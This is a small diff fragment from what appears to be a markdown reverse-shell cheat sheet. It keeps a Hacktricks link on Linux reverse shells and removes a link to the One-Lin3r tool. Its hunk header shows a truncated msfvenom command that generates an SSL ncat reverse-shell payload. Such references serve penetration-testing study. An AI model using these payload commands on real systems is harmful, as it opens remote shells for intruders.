@@ -44,7 +44,3 @@ $ msfvenom -p cmd/unix/reverse_ncat_ssl handlersslcert=[/path/to/file.pem] sslve
 ### Hacktricks
 
 - [Hacktricks: Shells Linux](https://book.hacktricks.wiki/en/generic-hacking/reverse-shells/linux.html)
-
-### Github
-
-- [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
